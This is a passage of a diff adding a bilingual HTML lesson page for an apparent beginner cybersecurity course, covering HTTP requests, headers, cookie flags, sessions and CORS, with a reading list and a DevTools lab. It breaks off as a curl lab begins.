@@ -1,0 +1,1324 @@
+<!doctype html>
+<html lang="en" data-lang="en" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Week 07 — Web I: HTTP Deep, Cookies, Sessions, Browsers | Pre Cybersecurity 0.1</title>
+<meta name="description" content="Follow a web request from your browser to the server: what HTTP sends, how cookies keep you logged in, and how accounts get hijacked.">
+<meta name="color-scheme" content="light dark">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<link rel="stylesheet" href="assets/style.css">
+<script>
+(function(){var r=document.documentElement;r.className+=" js";
+try{
+var l=localStorage.getItem("pc-lang")||localStorage.getItem("tz-lang");
+if(!l){l=(navigator.language||"").toLowerCase().indexOf("ar")===0?"ar":"en";}
+r.setAttribute("data-lang",l);r.setAttribute("lang",l);
+r.setAttribute("dir",l==="ar"?"rtl":"ltr");
+/* Light is the designed default. "auto" is still offered by the toggle, and
+   is remembered once chosen — it just isn't what a first visit lands on. */
+var t=localStorage.getItem("pc-theme")||localStorage.getItem("tz-theme");
+if(t==="dark"||t==="light"){r.setAttribute("data-theme",t);}
+else{r.setAttribute("data-theme","light");}
+}catch(e){r.setAttribute("data-theme","light");}})();
+</script>
+</head>
+<body data-week="7">
+<a class="skip" href="#main"><span class="only-en">Skip to content</span><span class="only-ar">تخطَّ إلى المحتوى</span></a>
+<header class="hdr">
+  <div class="hdr-in">
+    <a class="brand" href="index.html">
+      <span class="brand-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v6c0 4.5-3 7.6-7 9-4-1.4-7-4.5-7-9V6l7-3z"/><path d="M9.2 12.2l2 2 3.6-4"/></svg></span>
+      <span class="brand-text">
+        <span class="brand-name">Pre Cybersecurity</span>
+        <span class="brand-ver">v0.1</span>
+      </span>
+    </a>
+    <nav class="nav" aria-label="Primary">
+      <a href="index.html"><span class="only-en">Dashboard</span><span class="only-ar">لوحة التقدّم</span></a>
+      <a href="learn.html" aria-current="page"><span class="only-en">Learn</span><span class="only-ar">التعلّم</span></a>
+      <a href="path.html"><span class="only-en">Learning Path</span><span class="only-ar">مسار التعلّم</span></a>
+      <a href="practice.html"><span class="only-en">Practice</span><span class="only-ar">التدريب</span></a>
+      <a href="progress.html"><span class="only-en">Progress</span><span class="only-ar">تقدّمي</span></a>
+      <a href="resources.html"><span class="only-en">Resources</span><span class="only-ar">المصادر</span></a>
+    </nav>
+    <div class="hdr-tools">
+      <span class="seg" role="group" aria-label="Language / اللغة">
+        <button type="button" data-setlang="en" aria-pressed="true" lang="en">EN</button>
+        <button type="button" data-setlang="ar" aria-pressed="false" lang="ar">ع</button>
+      </span>
+      <span class="seg" role="group" aria-label="Appearance / المظهر">
+        <button type="button" data-settheme="light" aria-pressed="true" title="Light / فاتح"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4.2"/><path d="M12 2.5v2M12 19.5v2M2.5 12h2M19.5 12h2M5.2 5.2l1.4 1.4M17.4 17.4l1.4 1.4M18.8 5.2l-1.4 1.4M6.6 17.4l-1.4 1.4"/></svg></button>
+        <button type="button" data-settheme="dark" aria-pressed="false" title="Dark / داكن"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 14.5A8.5 8.5 0 0 1 9.5 4a8.5 8.5 0 1 0 10.5 10.5Z"/></svg></button>
+        <button type="button" data-settheme="auto" aria-pressed="false" title="Match system / حسب النظام">A</button>
+      </span>
+      <button class="burger" id="pc-burger" type="button" aria-expanded="false" aria-controls="pc-sheet">
+        <span class="sr">Menu</span>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+  <div class="sheet" id="pc-sheet">
+    <a href="index.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.5 12 3l9 7.5"/><path d="M5.5 9.5V20h13V9.5"/></svg><span class="only-en">Dashboard</span><span class="only-ar">لوحة التقدّم</span></a>
+    <a href="learn.html" aria-current="page"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2Z"/></svg><span class="only-en">Learn</span><span class="only-ar">التعلّم</span></a>
+    <a href="path.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="6" cy="19" r="2.5"/><circle cx="18" cy="5" r="2.5"/><path d="M8.5 19H14a3 3 0 0 0 0-6h-4a3 3 0 0 1 0-6h5.5"/></svg><span class="only-en">Learning Path</span><span class="only-ar">مسار التعلّم</span></a>
+    <a href="practice.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 3v6.5L4.2 18A2 2 0 0 0 6 21h12a2 2 0 0 0 1.8-3L15 9.5V3"/><path d="M8 3h8M7.5 14h9"/></svg><span class="only-en">Practice</span><span class="only-ar">التدريب</span></a>
+    <a href="progress.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3v18h18"/><path d="M7 15l3.5-4 3 2.5L20 7"/></svg><span class="only-en">Progress</span><span class="only-ar">تقدّمي</span></a>
+    <a href="resources.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7"/><path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7"/></svg><span class="only-en">Resources</span><span class="only-ar">المصادر</span></a>
+  </div>
+</header>
+<main id="main">
+<header class="page-head">
+  <div class="container">
+  <nav class="crumbs" aria-label="Breadcrumb">
+    <a href="index.html"><span class="only-en">Dashboard</span><span class="only-ar">لوحة التقدّم</span></a>
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
+    <a href="path.html#stage-04"><span class="only-en">Web Security</span><span class="only-ar">أمن الويب</span></a>
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
+    <span><span class="only-en">Week 07</span><span class="only-ar">الأسبوع 07</span></span>
+  </nav>
+  <!-- Names the same stage the learning path names, so the number in the corner of
+       the page matches the dot the student clicked to get here. -->
+  <span class="eyebrow" style="margin-top:14px"><span class="only-en">Stage 04 of 07 · Month 2</span><span class="only-ar">المرحلة 4 من 7 · الشهر الثاني</span></span>
+  <h1><span class="only-en">Web I: HTTP Deep, Cookies, Sessions, Browsers</span><span class="only-ar" dir="rtl" lang="ar">الويب ١: HTTP بعمق والكوكيز والجلسات والمتصفحات</span></h1>
+  <p class="lede"><span class="only-en">Follow a web request from your browser to the server: what HTTP sends, how cookies keep you logged in, and how accounts get hijacked.</span><span class="only-ar" dir="rtl" lang="ar">تابع طلب الويب من متصفحك إلى الخادم: ماذا يرسل HTTP، وكيف تُبقيك الكوكيز مسجّلاً للدخول، وكيف تُختطف الحسابات.</span></p>
+  <div class="meta-strip">
+    <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3v18h18"/><path d="M7 15l3.5-4 3 2.5L20 7"/></svg><span class="only-en">Intermediate</span><span class="only-ar">متوسط</span></span>
+    <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg><span class="only-en">~18h estimated</span><span class="only-ar">~18h تقديرياً</span></span>
+    <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2Z"/></svg>4 <span class="only-en">lessons</span><span class="only-ar">درساً</span></span>
+    <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="6" cy="19" r="2.5"/><circle cx="18" cy="5" r="2.5"/><path d="M8.5 19H14a3 3 0 0 0 0-6h-4a3 3 0 0 1 0-6h5.5"/></svg><a href="week-06.html"><span class="only-en">Week 06 checkpoint</span><span class="only-ar">الأسبوع 06 — نقطة تحقّق</span></a></span>
+  </div>
+  <div class="card-pad" style="margin-top:20px;padding:0">
+    <div style="display:flex;align-items:center;gap:14px;flex-wrap:wrap">
+      <span class="eyebrow"><span class="only-en">Your progress in this course</span><span class="only-ar">تقدّمك في هذا المسار</span></span>
+      <div id="pc-weekbar" style="flex:1 1 200px;min-width:140px"></div>
+      <span id="pc-weekbar-label" dir="ltr" style="font-weight:700;font-size:.86rem;color:var(--accent);font-variant-numeric:tabular-nums"></span>
+    </div>
+  </div>
+  </div>
+</header>
+
+<div class="section" style="padding-top:0;border-bottom:0">
+  <div class="container">
+  <div class="grid grid-2">
+    <div class="card">
+  <div class="card-head"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="5"/><circle cx="12" cy="12" r="1.4"/></svg><h2><span class="only-en">What you'll learn</span><span class="only-ar">ما ستتعلّمه</span></h2></div>
+  <div class="card-pad">
+    <ul class="outcomes only-en"><li>Trace a complete HTTP request/response cycle and name every stage between the Enter key and the rendered page</li><li>Use GET, POST, PUT, DELETE deliberately and explain when a server should use each</li><li>Classify any status code by its class (1xx–5xx) and explain what the class means</li><li>Read and explain the security-relevant request and response headers, including Host, User-Agent, Referer, Cookie, Set-Cookie, Authorization, Content-Type, and the CORS headers</li><li>Explain why HTTP is stateless, and how cookies and sessions restore state on top of it</li></ul>
+    <ul class="outcomes only-ar" dir="rtl" lang="ar"><li>تتبّع دورة طلب/استجابة HTTP كاملة وسمِّ كل مرحلة بين ضغطة Enter والصفحة المعروضة</li><li>استخدم GET و POST و PUT و DELETE عن قصد، واشرح متى ينبغي للسيرفر أن يستخدم كل واحد منها</li><li>صنّف أي رمز حالة حسب فئته (1xx–5xx) واشرح ما تعنيه الفئة فعلاً</li><li>اقرأ واشرح ترويسات الطلب والاستجابة ذات الصلة الأمنية، بما فيها Host و User-Agent و Referer و Cookie و Set-Cookie و Authorization و Content-Type وترويسات CORS</li><li>اشرح لماذا HTTP بلا حالة، وكيف تعيد الكوكيز والجلسات بناء الحالة فوقه</li></ul>
+    <a class="card-more" href="#objectives"><span class="only-en">All 8 objectives, with a checklist to tick off ↓</span><span class="only-ar" dir="rtl" lang="ar">كل الأهداف (8) مع قائمة تُعلّم عليها ↓</span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+  </div>
+</div>
+    <div class="card">
+  <div class="card-head"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20.6 13.4 12 22l-9-9V4h9z"/><circle cx="7.5" cy="7.5" r="1.2"/></svg><h2><span class="only-en">Terms you'll meet this week</span><span class="only-ar">مصطلحات ستقابلها هذا الأسبوع</span></h2></div>
+  <div class="card-pad">
+    <div class="chips"><span class="chip chip-accent">Request / Response</span><span class="chip chip-accent">HTTP Header</span><span class="chip chip-accent">Method</span><span class="chip chip-accent">Status Code</span><span class="chip chip-accent">Stateless</span><span class="chip chip-accent">Cookie</span></div>
+    <p class="hint"><span class="only-en">These stay in English on purpose. They are the words you will meet in the tools, the documentation and the interview.</span><span class="only-ar" dir="rtl" lang="ar">تبقى هذه المصطلحات بالإنجليزية عمداً. فهي الكلمات التي ستقابلها في الأدوات والوثائق والمقابلات.</span></p>
+    <a class="card-more" href="#terms"><span class="only-en">What each one means ↓</span><span class="only-ar" dir="rtl" lang="ar">ما معنى كل مصطلح ↓</span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+  </div>
+</div>
+  </div>
+  </div>
+</div>
+<nav class="wk-rail" aria-label="Sections / الأقسام"><div class="wk-rail-in"><div class="wk-rail-links"><a href="#objectives"><span class="only-en">What you&#x27;ll learn</span><span class="only-ar">ما ستتعلّمه</span></a><a href="#theory"><span class="only-en">Theory &amp; Concepts</span><span class="only-ar">النظرية والمفاهيم</span></a><a href="#lab"><span class="only-en">Guided Lab</span><span class="only-ar">المختبر الموجَّه</span></a><a href="#challenge"><span class="only-en">Challenge</span><span class="only-ar">التحدّي</span></a><a href="#payoff"><span class="only-en">Why this matters in security</span><span class="only-ar">لماذا يهم هذا أمنياً</span></a><a href="#checkpoint"><span class="only-en">Weekly Checkpoint</span><span class="only-ar">نقطة التحقّق الأسبوعية</span></a><a href="#notes"><span class="only-en">Concept Notes</span><span class="only-ar">ملاحظات مفاهيمية موسّعة</span></a><a href="#terms"><span class="only-en">Terms of the Week</span><span class="only-ar">مصطلحات الأسبوع</span></a></div><button type="button" id="pc-collapse" aria-pressed="false"><span class="only-en">Collapse all</span><span class="only-ar">اطوِ الكل</span></button></div></nav>
+<div class="container">
+<div class="flow">
+<details class="lesson-sec" id="objectives" data-sec="objectives" open>
+  <summary class="lesson-sec-head">
+    <span class="lesson-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="5"/><circle cx="12" cy="12" r="1.4"/></svg></span>
+    <span class="lesson-titles">
+      <h2><span class="only-en">What you&#x27;ll learn</span><span class="only-ar">ما ستتعلّمه</span></h2>
+      <span class="lesson-sub"><span><span class="only-en">The goals for this week</span><span class="only-ar">أهداف هذا الأسبوع</span></span></span>
+    </span>
+    
+    <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
+  </summary>
+  <div class="lesson-sec-body">
+    <div class="prose only-en"><ul>
+<li class="task">Trace a complete HTTP request/response cycle and name every stage between the Enter key and the rendered page</li>
+<li class="task">Use <code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code> deliberately and explain when a server should use each</li>
+<li class="task">Classify any status code by its class (1xx–5xx) and explain what the class <em>means</em></li>
+<li class="task">Read and explain the security-relevant request and response headers, including <code>Host</code>, <code>User-Agent</code>, <code>Referer</code>, <code>Cookie</code>, <code>Set-Cookie</code>, <code>Authorization</code>, <code>Content-Type</code>, and the CORS headers</li>
+<li class="task">Explain why HTTP is stateless, and how cookies and sessions restore state on top of it</li>
+<li class="task">Set and inspect <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code> on a real cookie, and name the attack each one blocks</li>
+<li class="task">Describe what the same-origin policy protects and what CORS relaxes</li>
+<li class="task">Capture, read, and modify HTTP traffic with browser DevTools, <code>curl</code>, and Burp Suite Community</li>
+</ul></div>
+    <div class="prose only-ar" dir="rtl" lang="ar"><ul>
+<li class="task">تتبّع دورة طلب/استجابة HTTP كاملة وسمِّ كل مرحلة بين ضغطة Enter والصفحة المعروضة</li>
+<li class="task">استخدم <code>GET</code> و <code>POST</code> و <code>PUT</code> و <code>DELETE</code> عن قصد، واشرح متى ينبغي للسيرفر أن يستخدم كل واحد منها</li>
+<li class="task">صنّف أي رمز حالة حسب فئته (1xx–5xx) واشرح ما تعنيه الفئة <em>فعلاً</em></li>
+<li class="task">اقرأ واشرح ترويسات الطلب والاستجابة ذات الصلة الأمنية، بما فيها <code>Host</code> و <code>User-Agent</code> و <code>Referer</code> و <code>Cookie</code> و <code>Set-Cookie</code> و <code>Authorization</code> و <code>Content-Type</code> وترويسات CORS</li>
+<li class="task">اشرح لماذا HTTP بلا حالة، وكيف تعيد الكوكيز والجلسات بناء الحالة فوقه</li>
+<li class="task">اضبط وافحص <code>HttpOnly</code> و <code>Secure</code> و <code>SameSite</code> على كوكي حقيقي، وسمِّ الهجوم الذي يمنعه كل واحد منها</li>
+<li class="task">صِف ما تحميه سياسة الأصل الواحد، وما الذي تُرخّيه CORS</li>
+<li class="task">التقط حركة HTTP واقرأها وعدّلها باستخدام DevTools في المتصفح، و <code>curl</code>، و Burp Suite Community</li>
+</ul></div>
+  </div>
+</details><details class="lesson-sec" id="theory" data-sec="theory" open>
+  <summary class="lesson-sec-head">
+    <span class="lesson-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2Z"/></svg></span>
+    <span class="lesson-titles">
+      <h2><span class="only-en">Theory &amp; Concepts</span><span class="only-ar">النظرية والمفاهيم</span></h2>
+      <span class="lesson-sub"><span><span class="only-en">≈4h · Read and take notes</span><span class="only-ar">≈4ساعات · اقرأ ودوّن الملاحظات</span></span></span>
+    </span>
+    <button class="done-toggle" type="button" data-done aria-pressed="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg><span><span class="only-en">Mark complete</span><span class="only-ar">علّم كمكتمل</span></span></button>
+    <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
+  </summary>
+  <div class="lesson-sec-body">
+    <div class="prose only-en"><div class="tablewrap"><table>
+<thead>
+<tr>
+<th>#</th>
+<th>Topic</th>
+<th>Resource</th>
+<th>Time</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>HTTP overview — the request/response cycle</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview">MDN — HTTP Overview</a></td>
+<td>35m</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Methods and status codes</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods">MDN — Methods</a> + <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status">MDN — Status</a></td>
+<td>40m</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Headers, by category</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers">MDN — HTTP Headers</a></td>
+<td>30m</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cookies and <code>Set-Cookie</code> flags</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies">MDN — Using HTTP cookies</a> + <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie"><code>Set-Cookie</code></a></td>
+<td>40m</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Sessions vs tokens</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Session">MDN — HTTP Session</a></td>
+<td>20m</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Same-origin policy and CORS</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">MDN — Same-origin policy</a> + <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">MDN — CORS</a></td>
+<td>35m</td>
+</tr>
+<tr>
+<td>7</td>
+<td>HTML / CSS / JS in the browser</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/What_is_JavaScript">MDN — What is JavaScript?</a> + <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">MDN — DOM intro</a></td>
+<td>20m</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Web servers, their config, and their logs</td>
+<td><a href="https://httpd.apache.org/docs/2.4/logs.html">Apache — Log Files</a> + <a href="https://nginx.org/en/docs/http/ngx_http_log_module.html">nginx log_module</a></td>
+<td>25m</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Arabic supplement:</strong> <a href="https://www.youtube.com/@IbrahimHegazy">إبراهيم حجازي — Ibrahim Hegazy</a> — web application vulnerabilities, explained end-to-end in Arabic. Pair it with <a href="https://www.youtube.com/@SECstien">SECstien — سكشـتاين</a> for shorter, attack-focused walkthroughs. Watch <em>after</em> the reading, never instead of it.</p>
+<blockquote>
+<p><strong>Note-taking rule still applies:</strong> explain the request/response cycle in your own words, from memory, before you touch DevTools. If you can't, you haven't learned it yet.</p>
+</blockquote></div>
+    <div class="prose only-ar" dir="rtl" lang="ar"><div class="tablewrap"><table>
+<thead>
+<tr>
+<th>#</th>
+<th>الموضوع</th>
+<th>المصدر</th>
+<th>الوقت</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>نظرة عامة على HTTP — دورة الطلب/الاستجابة</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview">MDN — HTTP Overview</a></td>
+<td>35 دقيقة</td>
+</tr>
+<tr>
+<td>2</td>
+<td>الطرق ورموز الحالة</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods">MDN — Methods</a> + <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status">MDN — Status</a></td>
+<td>40 دقيقة</td>
+</tr>
+<tr>
+<td>3</td>
+<td>الترويسات، حسب الفئة</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers">MDN — HTTP Headers</a></td>
+<td>30 دقيقة</td>
+</tr>
+<tr>
+<td>4</td>
+<td>الكوكيز وسمات <code>Set-Cookie</code></td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies">MDN — Using HTTP cookies</a> + <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie"><code>Set-Cookie</code></a></td>
+<td>40 دقيقة</td>
+</tr>
+<tr>
+<td>5</td>
+<td>الجلسات مقابل الرموز (Tokens)</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Session">MDN — HTTP Session</a></td>
+<td>20 دقيقة</td>
+</tr>
+<tr>
+<td>6</td>
+<td>سياسة الأصل الواحد و CORS</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">MDN — Same-origin policy</a> + <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">MDN — CORS</a></td>
+<td>35 دقيقة</td>
+</tr>
+<tr>
+<td>7</td>
+<td>HTML و CSS و JS في المتصفح</td>
+<td><a href="https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/What_is_JavaScript">MDN — What is JavaScript?</a> + <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">MDN — DOM intro</a></td>
+<td>20 دقيقة</td>
+</tr>
+<tr>
+<td>8</td>
+<td>خوادم الويب وإعداداتها وسجلاتها</td>
+<td><a href="https://httpd.apache.org/docs/2.4/logs.html">Apache — Log Files</a> + <a href="https://nginx.org/en/docs/http/ngx_http_log_module.html">nginx log_module</a></td>
+<td>25 دقيقة</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>إضافة بالعربية:</strong> <a href="https://www.youtube.com/@IbrahimHegazy">إبراهيم حجازي — Ibrahim Hegazy</a> — ثغرات تطبيقات الويب، مشروحة من البداية إلى النهاية بالعربية. اقرنه بـ <a href="https://www.youtube.com/@SECstien">SECstien — سكشـتاين</a> لجولات أقصر تركّز على الهجوم. شاهده <em>بعد</em> القراءة، لا بدلاً منها.</p>
+<blockquote>
+<p><strong>قاعدة تدوين الملاحظات ما زالت سارية:</strong> اشرح دورة الطلب/الاستجابة بكلماتك أنت، من الذاكرة، قبل أن تلمس DevTools. إن لم تستطع، فأنت لم تتعلّمها بعد.</p>
+</blockquote></div>
+  </div>
+</details><details class="lesson-sec" id="lab" data-sec="lab" open>
+  <summary class="lesson-sec-head">
+    <span class="lesson-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 3v6.5L4.2 18A2 2 0 0 0 6 21h12a2 2 0 0 0 1.8-3L15 9.5V3"/><path d="M8 3h8M7.5 14h9"/></svg></span>
+    <span class="lesson-titles">
+      <h2><span class="only-en">Guided Lab</span><span class="only-ar">المختبر الموجَّه</span></h2>
+      <span class="lesson-sub"><span><span class="only-en">≈7h · Step by step, with expected results</span><span class="only-ar">≈7ساعات · خطوة بخطوة مع النتائج المتوقعة</span></span></span>
+    </span>
+    <button class="done-toggle" type="button" data-done aria-pressed="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg><span><span class="only-en">Mark complete</span><span class="only-ar">علّم كمكتمل</span></span></button>
+    <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
+  </summary>
+  <div class="lesson-sec-body">
+    <div class="prose only-en"><p>Everything below runs inside VirtualBox. The browser labs run on the <strong>Ubuntu</strong> VM; <code>curl</code> and Burp run from <strong>Kali</strong>. Both VMs stay on the NAT Network from Week 1.</p>
+<h3>Lab 7.1 — Read the wire with DevTools (1.5h)</h3>
+<p><strong>Goal:</strong> See that a web page is not a thing — it is a transcript.</p>
+<p><strong>Setup:</strong> Ubuntu VM, Firefox or Chromium, any site. Open DevTools (<code>F12</code>) → <strong>Network</strong> tab. Tick "Persist Logs".</p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Clear the log, then load one page. You should see dozens of requests, not one. Sort by size. Which request is the HTML document?</li>
+<li>Click the <strong>first</strong> request (the document). Read, in this order: the request line (<code>GET /path HTTP/1.1</code>), then the <strong>Headers</strong> panel → Request Headers, then Response Headers, then the <strong>Response</strong> tab.</li>
+<li>Write down, by hand: the URL, the method, the <code>Host</code>, <code>User-Agent</code>, <code>Referer</code>, <code>Accept</code>, the response status, <code>Content-Type</code>, <code>Content-Length</code>, and every <code>Set-Cookie</code>.</li>
+<li>Find an image, a CSS file, and a JS file in the list. Compare their <code>Content-Type</code> values.</li>
+<li>Reload the page. Find the second load of the CSS file — note the status (<code>304</code>) and explain in your notes what the browser avoided downloading.</li>
+<li>Go to <strong>Storage</strong> → Cookies. Find the session cookie. Note every attribute: name, value, <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, <code>Path</code>, <code>Expires</code>.</li>
+<li>Open the <strong>Console</strong>. Run <code>document.cookie</code> and record what you see. Then compare with the cookie list from step 6.</li>
+</ol>
+<p><strong>Expected output:</strong> A hand-written table with 8–10 request/response headers you can explain, and a session cookie whose attributes you can name.</p>
+<p><strong>If you see this → it means:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Symptom</th>
+<th>Cause</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network tab is empty on load</td>
+<td>DevTools was opened <em>after</em> the page loaded — reload with it open</td>
+</tr>
+<tr>
+<td><code>document.cookie</code> shows less than the Storage panel</td>
+<td>That cookie is <code>HttpOnly</code> — deliberately hidden from JavaScript. <strong>This is the whole point of the flag</strong></td>
+</tr>
+<tr>
+<td>Almost everything is <code>200</code> from cache</td>
+<td>Disable cache checkbox (or <code>Ctrl+Shift+R</code>)</td>
+</tr>
+<tr>
+<td>Status shows <code>(from disk cache)</code></td>
+<td>Not a network request at all — the browser answered locally</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Lab 7.2 — The same requests, by hand, with curl (1.5h)</h3>
+<p><strong>Goal:</strong> Prove that the browser is a convenience, not a requirement.</p>
+<p><strong>Setup:</strong> Kali VM. <code>curl</code> is preinstalled.</p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>
